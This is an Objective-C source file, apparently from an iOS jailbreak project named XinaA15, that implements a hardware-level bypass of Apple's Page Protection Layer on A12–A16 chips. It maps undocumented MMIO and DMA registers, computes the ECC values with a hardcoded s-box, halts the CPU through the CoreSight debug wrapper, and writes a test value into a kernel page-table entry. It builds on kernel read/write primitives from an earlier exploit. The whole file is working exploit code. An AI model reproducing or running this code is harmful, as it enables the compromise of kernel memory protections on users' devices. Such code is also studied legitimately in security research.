//  GPU_CoreSight.m
//  XinaA15
//
//  Created by xina520
//
//

#import <Foundation/Foundation.h>

#include <unistd.h>
#include <sys/sysctl.h>
#include <pthread/pthread.h>
#include <IOSurface/IOSurfaceRef.h>
#include "pplrw-by-xina.h"

#define DBGWRAP_DBGHALT          (1ULL << 31)
#define DBGWRAP_DBGACK           (1ULL << 28)

uint32_t sbox_[] = {
    0x007, 0x00B, 0x00D, 0x013, 0x00E, 0x015, 0x01F, 0x016,
    0x019, 0x023, 0x02F, 0x037, 0x04F, 0x01A, 0x025, 0x043,
    0x03B, 0x057, 0x08F, 0x01C, 0x026, 0x029, 0x03D, 0x045,
    0x05B, 0x083, 0x097, 0x03E, 0x05D, 0x09B, 0x067, 0x117,
    0x02A, 0x031, 0x046, 0x049, 0x085, 0x103, 0x05E, 0x09D,
    0x06B, 0x0A7, 0x11B, 0x217, 0x09E, 0x06D, 0x0AB, 0x0C7,
    0x127, 0x02C, 0x032, 0x04A, 0x051, 0x086, 0x089, 0x105,
    0x203, 0x06E, 0x0AD, 0x12B, 0x147, 0x227, 0x034, 0x04C,
    0x052, 0x076, 0x08A, 0x091, 0x0AE, 0x106, 0x109, 0x0D3,
    0x12D, 0x205, 0x22B, 0x247, 0x07A, 0x0D5, 0x153, 0x22D,
    0x038, 0x054, 0x08C, 0x092, 0x061, 0x10A, 0x111, 0x206,
    0x209, 0x07C, 0x0BA, 0x0D6, 0x155, 0x193, 0x253, 0x28B,
    0x307, 0x0BC, 0x0DA, 0x156, 0x255, 0x293, 0x30B, 0x058,
    0x094, 0x062, 0x10C, 0x112, 0x0A1, 0x20A, 0x211, 0x0DC,
    0x196, 0x199, 0x256, 0x165, 0x259, 0x263, 0x30D, 0x313,
    0x098, 0x064, 0x114, 0x0A2, 0x15C, 0x0EA, 0x20C, 0x0C1,
    0x121, 0x212, 0x166, 0x19A, 0x299, 0x265, 0x2A3, 0x315,
    0x0EC, 0x1A6, 0x29A, 0x266, 0x1A9, 0x269, 0x319, 0x2C3,
    0x323, 0x068, 0x0A4, 0x118, 0x0C2, 0x122, 0x214, 0x141,
    0x221, 0x0F4, 0x16C, 0x1AA, 0x2A9, 0x325, 0x343, 0x0F8,
    0x174, 0x1AC, 0x2AA, 0x326, 0x329, 0x345, 0x383, 0x070,
    0x0A8, 0x0C4, 0x124, 0x218, 0x142, 0x222, 0x181, 0x241,
    0x178, 0x2AC, 0x32A, 0x2D1, 0x0B0, 0x0C8, 0x128, 0x144,
    0x1B8, 0x224, 0x1D4, 0x182, 0x242, 0x2D2, 0x32C, 0x281,
    0x351, 0x389, 0x1D8, 0x2D4, 0x352, 0x38A, 0x391, 0x0D0,
    0x130, 0x148, 0x228, 0x184, 0x244, 0x282, 0x301, 0x1E4,
    0x2D8, 0x354, 0x38C, 0x392, 0x1E8, 0x2E4, 0x358, 0x394,
    0x362, 0x3A1, 0x150, 0x230, 0x188, 0x248, 0x284, 0x302,
    0x1F0, 0x2E8, 0x364, 0x398, 0x3A2, 0x0E0, 0x190, 0x250,
    0x2F0, 0x288, 0x368, 0x304, 0x3A4, 0x370, 0x3A8, 0x3C4,
    0x160, 0x290, 0x308, 0x3B0, 0x3C8, 0x3D0, 0x1A0, 0x260,
    0x310, 0x1C0, 0x2A0, 0x3E0, 0x2C0, 0x320, 0x340, 0x380
};

uint32_t read_dword(uint64_t buffer) {
    return *(uint32_t *)buffer;
}

void write_dword(uint64_t addr, uint32_t value) {
    *(uint32_t *)addr= value;
}

uint64_t read_qword(uint64_t buffer) {
    return *(uint64_t *)buffer;
}

void write_qword(uint64_t addr, uint64_t value) {
    *(uint64_t *)addr= value;
}

// Calculate ecc function based on the provided sbox and buffer
uint32_t calculate_ecc(const uint8_t* buffer) {
    uint32_t acc = 0;
    for (int i = 0; i < 8; ++i) {
        int pos = i * 4;
        uint32_t value = read_dword((uint64_t)buffer + pos);
        for (int j = 0; j < 32; ++j) {
            if (((value >> j) & 1) != 0) {
                acc ^= sbox_[32 * i + j];
            }
        }
    }
    return acc;
}

void dma_ctrl_1_1516(uint64_t ctrl) {
    uint64_t value = read_qword(ctrl);
    write_qword(ctrl, value | 0x8000000000000001);
    sleep(1);
    while ((~read_qword(ctrl) & 0x8000000000000001) != 0) {
        sleep(1);
    }
}

void dma_ctrl_2_1516(uint64_t ctrl,int flag) {
    uint64_t value = read_qword(ctrl);
    if (flag) {
        if ((value & 0x1000000000000000) == 0) {
            value = value | 0x1000000000000000;
            write_qword(ctrl, value);
        }
    } else {
        if ((value & 0x1000000000000000) != 0) {
            value = value & ~0x1000000000000000;
            write_qword(ctrl, value);
        }
    }
}

void dma_ctrl_3_1516(uint64_t ctrl,uint64_t value) {
    value = value | 0x8000000000000000;
    uint64_t ctrl_value =read_qword(ctrl);
    write_qword(ctrl, ctrl_value & value);
    while ((read_qword(ctrl) & 0x8000000000000001) != 0) {
        sleep(1);
    }
}

void dma_init_1516(uint64_t base6140008, uint64_t base6140108, uint64_t original_value_0x206140108) {
    dma_ctrl_1_1516(base6140108);
    dma_ctrl_2_1516(base6140008, 0);
    dma_ctrl_3_1516(base6140108, original_value_0x206140108);
}

void dma_done_1516(uint64_t base6140008, uint64_t base6140108, uint64_t original_value_0x206140108) {
    dma_ctrl_1_1516(base6140108);
    dma_ctrl_2_1516(base6140008, 1);
    dma_ctrl_3_1516(base6140108, original_value_0x206140108);
}

void ml_dbgwrap_halt_cpu_1516(uint64_t coresight_base_utt) {
    uint64_t dbgWrapReg = read_qword(coresight_base_utt);
    if ((dbgWrapReg & 0x90000000) != 0)
        return;
    
    write_qword(coresight_base_utt, dbgWrapReg | DBGWRAP_DBGHALT);
    if((read_qword(coresight_base_utt) & DBGWRAP_DBGACK) == 0) {
        printf("match %llx %llx %llx\n", read_qword(coresight_base_utt), DBGWRAP_DBGACK, read_qword(coresight_base_utt) & DBGWRAP_DBGACK);
    } else {
        printf("mismatch %llx %llx %llx\n", read_qword(coresight_base_utt), DBGWRAP_DBGACK, read_qword(coresight_base_utt) & DBGWRAP_DBGACK);
    }
    usleep(5000);
    if((read_qword(coresight_base_utt) & DBGWRAP_DBGACK) == 0) {
        printf("match %llx %llx %llx\n", read_qword(coresight_base_utt), DBGWRAP_DBGACK, read_qword(coresight_base_utt) & DBGWRAP_DBGACK);
    } else {
        printf("mismatch %llx %llx %llx\n", read_qword(coresight_base_utt), DBGWRAP_DBGACK, read_qword(coresight_base_utt) & DBGWRAP_DBGACK);
        return;
    }
    while ((read_qword(coresight_base_utt) & DBGWRAP_DBGACK) == 0) { }
}

void ml_dbgwrap_unhalt_cpu_1516(uint64_t coresight_base_utt) {
    uint64_t dbgWrapReg = read_qword(coresight_base_utt);
    
    write_qword(coresight_base_utt, (dbgWrapReg & 0xFFFFFFFF2FFFFFFF) | 0x40000000);
    if((read_qword(coresight_base_utt) & DBGWRAP_DBGACK) == 0) {
        printf("match %llx %llx %llx\n", read_qword(coresight_base_utt), DBGWRAP_DBGACK, read_qword(coresight_base_utt) & DBGWRAP_DBGACK);
        return;
    } else {
        printf("mismatch %llx %llx %llx\n", read_qword(coresight_base_utt), DBGWRAP_DBGACK, read_qword(coresight_base_utt) & DBGWRAP_DBGACK);
    }
    while ((read_qword(coresight_base_utt) & DBGWRAP_DBGACK) != 0) { }
}

//form fugu
uint64_t IO_GetMMAP(uint64_t phys, uint64_t size)
{
    return (uint64_t)IOSurface_map(phys, size);
}

//form 37c3
void write_data_with_mmio(uint64_t kern_addr, uint64_t base6150000, uint64_t base6140008, uint64_t base6140108, uint64_t original_value_0x206140108, uint64_t mask, uint64_t i, uint64_t pass) {
    uint64_t phys_addr = vtophys_kfd(kern_addr);
    printf("kern_addr phys_addr: %llx %llx\n", kern_addr, phys_addr);
    uint64_t base6150040 = base6150000 + 0x40;
    uint64_t base6150048 = base6150000 + 0x48;
    uint64_t old_p = 0x2000000 | (phys_addr & 0x3FF0);
    uint64_t w_p = 0x2000000 | (phys_addr & 0x3FC0);
    write_qword(base6150040, w_p);
    uint64_t fix = old_p - w_p;
    uint8_t data[0x40] = {0};
    kreadbuf_kfd(kern_addr - fix, data, 0x40);
    memcpy((void *)&data[fix], (void *)&pass, sizeof(uint64_t));
    
    dma_init_1516(base6140008, base6140108, original_value_0x206140108);
    
    uint32_t ecc1 = calculate_ecc(data);
    uint32_t ecc2 = calculate_ecc(data + 0x20);
    int pos = 0;
    while (pos < 0x40) {
        write_qword(base6150048, read_qword((uint64_t)data + pos));
        pos += 8;
    }
    uint64_t phys_addr_upper = ((((phys_addr >> 14) & mask) << 18) & 0x3FFFFFFFFFFFF);
    uint64_t value = phys_addr_upper | ((uint64_t)ecc1 << i) | ((uint64_t)ecc2 << 50) | 0x1F;
    write_qword(base6150048, value);
    
    dma_done_1516(base6140008, base6140108, original_value_0x206140108);
    printf("dma_done\n");
    usleep(3000);
}

int pplwrite_test(void) {
    uint64_t tte = kread64_kfd(get_current_pmap());
    uint64_t tte1 = kread64_kfd(tte);
    uint64_t table = tte1 & ~0xfff;
    uint64_t table_v = phystokv_kfd(table);
    
    dispatch_queue_t queue = dispatch_queue_create("com.example.my_queue", DISPATCH_QUEUE_SERIAL);
    dispatch_queue_set_specific(queue, CFRunLoopGetMain(), CFRunLoopGetMain(), NULL);
    dispatch_async(queue, ^{
        uint32_t cpufamily;
        size_t len = sizeof(cpufamily);
        if (sysctlbyname("hw.cpufamily", &cpufamily, &len, NULL, 0) == -1) {
            perror("sysctl");
        } else {
            printf("CPU Family: %x\n", cpufamily);
        }
        
        uint64_t i = 0, mask=0, base=0;
        uint32_t command = 0;
        bool isa15a16=false;
        switch (cpufamily) {
            case 0x8765EDEA:   // CPUFAMILY_ARM_EVEREST_SAWTOOTH (A16)
                base = 0x23B700408;
                command = 0x1F0023FF;
                i = 8;
                mask = 0x7FFFFFF;
                isa15a16=true;
                break;
            case 0xDA33D83D:   // CPUFAMILY_ARM_AVALANCHE_BLIZZARD (A15)
                base = 0x23B7003C8;
                command = 0x1F0023FF;
                i = 8;
                mask = 0x3FFFFF;
                isa15a16=true;
                break;
            case 0x1B588BB3:   // CPUFAMILY_ARM_FIRESTORM_ICESTORM (A14)
                base = 0x23B7003D0;
                command = 0x1F0023FF;
                i = 0x28;
                mask = 0x3FFFFF;
                break;
            case 0x462504D2:   // CPUFAMILY_ARM_LIGHTNING_THUNDER (A13)
                base = 0x23B080390;
                command = 0x1F0003FF;
                i = 0x28;
                mask = 0x3FFFFF;
                break;
            case 0x07D34B9F:   // CPUFAMILY_ARM_VORTEX_TEMPEST (A12)
                base = 0x23B080388;
                command = 0x1F0003FF;
                i = 0x28;
                mask = 0x3FFFFF;
                break;
            default:
                printf("Unsupported CPU family %x\n", cpufamily);
                return;
        }
        printf("base: %llx\n", base);
        
        uint64_t base23b7003c8  = IO_GetMMAP(base,0x8);
        uint64_t base6040000    = IO_GetMMAP(0x206040000, 0x100);
        uint64_t base6140000    = IO_GetMMAP(0x206140000, 0x200);
        uint64_t base6150000    = IO_GetMMAP(0x206150000, 0x100);
        uint64_t base6140008    = base6140000 + 0x8;
        uint64_t base6140108    = base6140000 + 0x108;
        
        printf("base23b7003c8:  %llx\n", base23b7003c8);
        printf("base6040000:    %llx\n", base6040000);
        printf("base6140000:    %llx\n", base6140000);
        printf("base6150000:    %llx\n", base6150000);
        printf("base6140008:    %llx\n", base6140008);
        printf("base6140108:    %llx\n", base6140108);
        
        uint64_t original_value_0x206140108 = *(uint64_t *)base6140108;
        printf("original_value_0x206140108: %llx\n", original_value_0x206140108);
        
        if ((~read_dword(base23b7003c8) & 0xF) != 0){
            write_dword(base23b7003c8, command);
            printf("*base23b7003c8: %x\n", * (uint32_t *)base23b7003c8);
            while (1) {
                if ((~read_dword(base23b7003c8) & 0xF) == 0) {
                    break;
                }
            }
        }
        
        uint64_t base6150020 = base6150000 + 0x20;
        
        if (isa15a16) {
            write_qword(base6150020, 1);
            char buf[sizeof(uint64_t)] = {read_qword(base6150020)};
            hexdump(buf, sizeof(buf));
        }
        
        ml_dbgwrap_halt_cpu_1516(base6040000);
        
        uint64_t val = 0x4141414141414141;
        write_data_with_mmio(table_v + 0x8, base6150000, base6140008, base6140108, original_value_0x206140108, mask, i, val);
        
        ml_dbgwrap_unhalt_cpu_1516(base6040000);
        printf("unhalted\n");
        
        if (isa15a16) {
            write_qword(base6150020, 0);
            char buf[sizeof(uint64_t)] = {read_qword(base6150020)};
            hexdump(buf, sizeof(buf));
        }
        
        printf("%llx : %llx\n", table_v + 0x8, kread64_kfd(table_v + 0x8));
    });
    return 0;
}
